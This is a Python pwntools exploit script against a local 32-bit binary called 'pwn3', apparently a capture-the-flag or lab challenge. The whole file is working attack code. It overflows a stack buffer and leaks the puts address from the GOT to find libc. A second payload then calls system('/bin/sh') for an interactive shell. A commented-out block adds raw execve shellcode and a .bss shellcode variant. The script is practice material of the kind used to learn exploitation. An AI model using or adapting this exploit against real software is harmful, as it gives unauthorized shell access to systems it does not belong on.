from pwn import *

e = ELF('./pwn3')
libc = ELF('/lib32/libc.so.6')
p = process('./pwn3')

#shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
'''
shellcode = asm(shellcraft.i386.linux.sh())
bss_addr = e.bss()
gets_addr = e.symbols['gets']

print "bss: " + hex(bss_addr)
print "gets: " + hex(gets_addr)

payload = 'A'*140
payload += p32(gets_addr)
payload += p32(bss_addr)
payload += p32(bss_addr)

p.sendline(payload)
p.sendline(shellcode)
p.interactive()
'''

puts_addr = e.symbols['puts']
popret_addr = 0x8048319

payload = 'A'*140
payload += p32(puts_addr)
payload += p32(e.symbols['_start'])
payload += p32(e.got['puts'])

print "e.symbols['puts']: " + hex(puts_addr)
print "e.got['puts']: " + hex(e.got['puts']) 

p.sendline(payload)
print p.recvuntil(':')
print p.recvline()
leak = u32(p.recvline()[:4])
libc_base_addr = leak - libc.symbols['puts']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*140
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()